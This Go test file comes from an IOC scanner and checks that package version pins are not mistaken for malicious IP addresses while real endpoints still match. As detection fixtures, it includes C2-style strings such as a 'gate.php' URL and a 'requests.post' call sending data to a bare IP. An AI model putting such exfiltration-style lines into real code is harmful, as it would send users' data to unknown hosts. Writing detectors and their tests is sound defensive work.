package iocscan

import "testing"

// A four-segment version is ordinary in Python, .NET and Java packaging, and
// allow.VersionLikeIP cannot reject it: that rule requires every octet <= 31, so
// 4.13.0.92 and 4.10.0.82 pass as addresses and get looked up as network endpoints.
//
// Measured on production 2026-08-08: IOC-STIX-MATCH was the SOLE evidence for 2,173 of
// pypi's 8,058 malware mints. Sampled matches included the line
// `"opencv-python>=4.13.0.92",` from a setup.py install_requires list, recorded as
// "Malicious IP address 4.10.0.82". A version pin is not a connection.
func TestIPv4InVersionConstraint(t *testing.T) {
	versions := map[string]string{
		// Verbatim production shape.
		`  "opencv-python>=4.13.0.92",`: "4.13.0.92",
		`torch==2.10.0.41`:              "2.10.0.41",
		`numpy ~= 4.10.0.82`:            "4.10.0.82",
		`"pkg": "^1.2.3.4"`:             "1.2.3.4",
		`serde = "~1.2.3.4"`:            "1.2.3.4",
		`requires >1.2.3.4`:             "1.2.3.4",
		`before <1.2.3.4`:               "1.2.3.4",
		`pinned to v4.10.0.82`:          "4.10.0.82",
		`Version V1.2.3.4`:              "1.2.3.4",
		`!=1.2.3.4`:                     "1.2.3.4",
	}
	for s, quad := range versions {
		if !ipv4InVersionConstraint(s, atQuad(t, s, quad)) {
			t.Errorf("ipv4InVersionConstraint(%q) = false, want true", s)
		}
	}

	// Anything a real C2 could inhabit must still be matchable. Plain assignment is
	// the important one: `=` alone is how configuration names a host.
	addresses := map[string]string{
		`SERVER=1.2.3.4`:          "1.2.3.4",
		`host: 1.2.3.4`:           "1.2.3.4",
		`http://1.2.3.4/gate.php`: "1.2.3.4",
		`connect 1.2.3.4 now`:     "1.2.3.4",
		`"c2": "1.2.3.4"`:         "1.2.3.4",
		`rev4.10.0.82`:            "4.10.0.82", // the v is part of a word
		`REMOTE_ADDR=1.2.3.4`:     "1.2.3.4",
	}
	for s, quad := range addresses {
		if ipv4InVersionConstraint(s, atQuad(t, s, quad)) {
			t.Errorf("ipv4InVersionConstraint(%q) = true, want false — a real address was dropped", s)
		}
	}
}

// End-to-end through the matcher: a feed carrying the version-shaped quad as an
// indicator must not match it in a requirements line, but must still match it when the
// same value appears as an actual endpoint.
func TestVersionConstraintNotMatchedByFeed(t *testing.T) {
	set := NewIndicatorSet()
	set.Add(&Indicator{Type: TypeIPv4, Value: "4.13.0.92"})
	m := &Matcher{set: set}

	if got := m.matchLine(`  "opencv-python>=4.13.0.92",`, false); len(got) != 0 {
		t.Errorf("matched a version pin as an IP indicator: %+v", got)
	}
	if got := m.matchLine(`requests.post("http://4.13.0.92/x", data=d)`, false); len(got) == 0 {
		t.Error("stopped matching the same value used as a real endpoint")
	}
}
